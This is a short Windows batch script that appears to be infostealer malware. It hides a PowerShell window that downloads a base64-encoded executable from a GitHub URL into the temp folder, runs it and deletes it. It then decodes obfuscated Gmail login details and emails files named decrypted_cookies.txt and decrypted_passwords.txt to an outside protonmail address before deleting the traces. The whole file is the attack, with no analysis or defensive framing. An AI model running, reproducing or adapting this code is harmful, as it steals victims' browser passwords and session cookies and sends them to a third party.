@echo off
powershell -windowstyle hidden -c "$p=$env:TEMP+'\a.exe'; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/deep-oasis/test/main/main.enc')));"
%TEMP%\a.exe
del %TEMP%\a.exe
powershell -c "Function c($t){return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($t))};$a=c('a29zb3Zsb3RvbkBnbWFpbC5jb20=');$b=c('enF4d2NlVnIxIUAjcQ==');$Email=New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587);$Email.EnableSsl=$true;$Email.Credentials=New-Object System.Net.NetworkCredential($a, $b);$emailMessage=New-Object System.Net.Mail.MailMessage($a,'belkonos@protonmail.com',$env:UserName,'Attached');$emailMessage.Attachments.Add((Join-Path -P $env:temp -ChildPath 'decrypted_cookies.txt'));$emailMessage.Attachments.Add((Join-Path -P $env:temp -ChildPath 'decrypted_passwords.txt'));$Email.Send($emailMessage)"
del %TEMP%\decrypted_passwords.txt
del %TEMP%\decrypted_cookies.txt
